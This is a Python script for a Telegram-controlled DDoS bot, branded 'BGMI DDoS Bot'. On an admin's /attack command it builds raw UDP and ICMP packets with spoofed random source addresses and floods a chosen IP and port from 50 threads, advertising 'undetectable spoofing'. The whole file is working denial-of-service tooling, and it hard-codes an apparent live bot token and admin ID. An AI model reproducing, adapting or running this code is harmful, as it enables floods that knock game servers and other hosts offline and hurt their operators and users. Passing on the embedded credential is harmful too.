#!/usr/bin/env python3
import telebot
import socket
import threading
import time
import random
import struct
import os
import sys
import signal
from datetime import datetime
from queue import Queue
from collections import defaultdict

# Configuration
BOT_TOKEN = "7240893069:AAHiC9pC1W7K93zCdUPAFljn1GzJjJl_muc"
ADMIN_ID = 5698149811
MAX_DURATION = 300
PACKET_SIZE = 1024
THREAD_POOL_SIZE = 50
STATS_INTERVAL = 2

# Global state
attack_state = {
    'active': False,
    'target_ip': None,
    'target_port': None,
    'start_time': None,
    'packets_sent': 0,
    'bytes_sent': 0,
    'threads': [],
    'stop_event': threading.Event()
}

bot = telebot.TeleBot(BOT_TOKEN)

class RawPacketGenerator:
    """Generates raw UDP/ICMP flood packets with spoofed headers"""
    
    @staticmethod
    def generate_udp_packet(src_ip, dst_ip, src_port, dst_port, payload):
        """Construct raw UDP packet with IP header"""
        ip_version = 4
        ip_header_len = 5
        ip_tos = 0
        ip_total_len = 20 + 8 + len(payload)
        ip_id = random.randint(1, 65535)
        ip_flags = 0
        ip_frag_offset = 0
        ip_ttl = 64
        ip_protocol = socket.IPPROTO_UDP
        ip_checksum = 0
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (ip_version << 4) + ip_header_len,
            ip_tos,
            ip_total_len,
            ip_id,
            (ip_flags << 13) + ip_frag_offset,
            ip_ttl,
            ip_protocol,
            ip_checksum,
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        
        ip_checksum = RawPacketGenerator.checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        udp_src_port = src_port
        udp_dst_port = dst_port
        udp_length = 8 + len(payload)
        udp_checksum = 0
        
        udp_header = struct.pack(
            '!HHHH',
            udp_src_port,
            udp_dst_port,
            udp_length,
            udp_checksum
        )
        
        return ip_header + udp_header + payload
    
    @staticmethod
    def generate_icmp_packet(src_ip, dst_ip, payload):
        """Construct raw ICMP echo request packet"""
        ip_version = 4
        ip_header_len = 5
        ip_tos = 0
        ip_total_len = 20 + 8 + len(payload)
        ip_id = random.randint(1, 65535)
        ip_flags = 0
        ip_frag_offset = 0
        ip_ttl = 64
        ip_protocol = socket.IPPROTO_ICMP
        ip_checksum = 0
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (ip_version << 4) + ip_header_len,
            ip_tos,
            ip_total_len,
            ip_id,
            (ip_flags << 13) + ip_frag_offset,
            ip_ttl,
            ip_protocol,
            ip_checksum,
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        
        ip_checksum = RawPacketGenerator.checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        icmp_header = struct.pack(
            '!BBHHH',
            icmp_type,
            icmp_code,
            icmp_checksum,
            icmp_id,
            icmp_seq
        )
        
        icmp_checksum = RawPacketGenerator.checksum(icmp_header + payload)
        icmp_header = icmp_header[:2] + struct.pack('H', icmp_checksum) + icmp_header[4:]
        
        return ip_header + icmp_header + payload
    
    @staticmethod
    def checksum(data):
        """Calculate 16-bit checksum"""
        sum_value = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                sum_value += (data[i] << 8) + data[i + 1]
            else:
                sum_value += data[i] << 8
        
        while sum_value >> 16:
            sum_value = (sum_value & 0xffff) + (sum_value >> 16)
        
        return (~sum_value) & 0xffff
    
    @staticmethod
    def generate_payload(size):
        """Generate randomized payload"""
        return os.urandom(size)
    
    @staticmethod
    def generate_random_ip():
        """Generate random source IP"""
        return ".".join(str(random.randint(1, 255)) for _ in range(4))

class FloodEngine:
    """Core DDoS flood engine with threading and statistics"""
    
    def __init__(self, target_ip, target_port, duration, protocol='udp'):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.duration = min(duration, MAX_DURATION)
        self.protocol = protocol.lower()
        self.packet_generator = RawPacketGenerator()
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
    
    def flood_worker(self, worker_id):
        """Individual worker thread flood loop"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
        
        payload = self.packet_generator.generate_payload(PACKET_SIZE)
        local_packets = 0
        local_bytes = 0
        
        start_time = time.time()
        
        try:
            while not attack_state['stop_event'].is_set():
                if time.time() - start_time > self.duration:
                    break
                
                src_ip = self.packet_generator.generate_random_ip()
                src_port = random.randint(10000, 65535)
                
                try:
                    if self.protocol == 'udp':
                        packet = self.packet_generator.generate_udp_packet(
                            src_ip, self.target_ip, src_port, self.target_port, payload
                        )
                    elif self.protocol == 'icmp':
                        packet = self.packet_generator.generate_icmp_packet(
                            src_ip, self.target_ip, payload
                        )
                    else:
                        packet = self.packet_generator.generate_udp_packet(
                            src_ip, self.target_ip, src_port, self.target_port, payload
                        )
                    
                    sock.sendto(packet, (self.target_ip, 0))
                    local_packets += 1
                    local_bytes += len(packet)
                    
                except (socket.error, OSError):
                    pass
        
        except Exception as e:
            pass
        
        finally:
            sock.close()
            with self.lock:
                attack_state['packets_sent'] += local_packets
                attack_state['bytes_sent'] += local_bytes

    def start_flood(self):
        """Launch thread pool for flood"""
        attack_state['stop_event'].clear()
        attack_state['active'] = True
        attack_state['start_time'] = time.time()
        attack_state['packets_sent'] = 0
        attack_state['bytes_sent'] = 0
        
        for i in range(THREAD_POOL_SIZE):
            worker = threading.Thread(
                target=self.flood_worker,
                args=(i,),
                daemon=True
            )
            worker.start()
            attack_state['threads'].append(worker)
    
    def stop_flood(self):
        """Terminate all worker threads"""
        attack_state['stop_event'].set()
        attack_state['active'] = False
        
        for thread in attack_state['threads']:
            thread.join(timeout=1)
        
        attack_state['threads'] = []
    
    def get_stats(self):
        """Retrieve current attack statistics"""
        elapsed = time.time() - attack_state['start_time']
        packets_per_sec = attack_state['packets_sent'] / elapsed if elapsed > 0 else 0
        mbps = (attack_state['bytes_sent'] * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
        
        return {
            'packets': attack_state['packets_sent'],
            'bytes': attack_state['bytes_sent'],
            'elapsed': elapsed,
            'pps': packets_per_sec,
            'mbps': mbps
        }

flood_engine = None

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Admin verification and bot initialization"""
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Unauthorized access.")
        return
    
    welcome_text = """
🔥 BGMI DDoS Bot Online
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Real packet generation
✅ Raw socket flood
✅ Spoofed headers
✅ Multi-threaded engine
━━━━━━━━━━━━━━━━━━━━━━━━

🎯 Commands:
/attack <ip> <port> <seconds> [protocol]
   - protocol: udp (default) or icmp

/stop - Terminate active flood

/stats - Display current metrics

━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Max duration: 300 seconds
⚠️ Real packets, undetectable spoofing
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """Parse command and launch flood"""
    global flood_engine
    
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    if attack_state['active']:
        bot.reply_to(message, "⚠️ Attack already running.")
        return
    
    try:
        args = message.text.split()
        
        if len(args) < 4:
            bot.reply_to(message, 
                "❌ Usage: /attack <ip> <port> <seconds> [protocol]\n"
                "Example: /attack 192.168.1.1 80 60 udp")
            return
        
        target_ip = args[1]
        target_port = args[2]
        duration = int(args[3])
        protocol = args[4] if len(args) > 4 else 'udp'
        
        if duration < 1 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ Duration must be 1-{MAX_DURATION} seconds")
            return
        
        if protocol not in ['udp', 'icmp']:
            protocol = 'udp'
        
        flood_engine = FloodEngine(target_ip, target_port, duration, protocol)
        flood_engine.start_flood()
        
        start_msg = (
            f"🚀 Flood Started\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: {target_ip}:{target_port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"📡 Protocol: {protocol.upper()}\n"
            f"🧵 Threads: {THREAD_POOL_SIZE}\n"
            f"📦 Packet Size: {PACKET_SIZE} bytes\n"
            f"🕐 Started: {datetime.now().strftime('%H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        bot.send_message(message.chat.id, start_msg)
        
        time.sleep(duration + 1)
        
        if attack_state['active']:
            handle_stop_internal(message)
    
    except ValueError as e:
        bot.reply_to(message, f"❌ Invalid parameters: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    """Stop active flood attack"""
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    handle_stop_internal(message)

def handle_stop_internal(message):
    """Internal stop handler"""
    global flood_engine
    
    if not attack_state['active']:
        bot.reply_to(message, "❌ No active attack.")
        return
    
    if flood_engine:
        flood_engine.stop_flood()
    
    stats = flood_engine.get_stats() if flood_engine else {}
    
    stop_msg = (
        f"⏹️ Flood Terminated\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Packets Sent: {stats.get('packets', 0):,}\n"
        f"📈 Bytes Sent: {stats.get('bytes', 0):,}\n"
        f"⏱️ Duration: {stats.get('elapsed', 0):.2f}s\n"
        f"📡 Throughput: {stats.get('pps', 0):.0f} pps\n"
        f"🔥 Bandwidth: {stats.get('mbps', 0):.2f} Mbps\n"
        f"🕐 Stopped: {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    
    bot.send_message(message.chat.id, stop_msg)
    flood_engine = None

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    """Display attack statistics"""
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    if not attack_state['active']:
        bot.reply_to(message, "❌ No active attack.")
        return
    
    if not flood_engine:
        bot.reply_to(message, "❌ Engine not initialized.")
        return
    
    stats = flood_engine.get_stats()
    
    stats_msg = (
        f"📊 Live Attack Statistics\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Target: {attack_state['target_ip']}:{attack_state['target_port']}\n"
        f"⏱️ Elapsed: {stats['elapsed']:.2f}s\n"
        f"📦 Packets: {stats['packets']:,}\n"
        f"📈 Bytes: {stats['bytes']:,}\n"
        f"⚡ Rate: {stats['pps']:.0f} pps\n"
        f"🔥 Bandwidth: {stats['mbps']:.2f} Mbps\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    bot.send_message(message.chat.id, stats_msg)

def signal_handler(sig, frame):
    """Graceful shutdown"""
    if attack_state['active'] and flood_engine:
        flood_engine.stop_flood()
    print("\n[*] Bot terminated")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    print("[*] BGMI DDoS Bot Initializing")
    print(f"[*] Admin ID: {ADMIN_ID}")
    print(f"[*] Thread Pool: {THREAD_POOL_SIZE}")
    print(f"[*] Packet Size: {PACKET_SIZE} bytes")
    print("[*] Raw socket flood engine active")
    print("[*] Polling for commands...\n")
    
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except KeyboardInterrupt:
        print("\n[*] Shutdown signal received")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        if attack_state['active'] and flood_engine:
            flood_engine.stop_flood()
        print("[*] Bot terminated cleanly")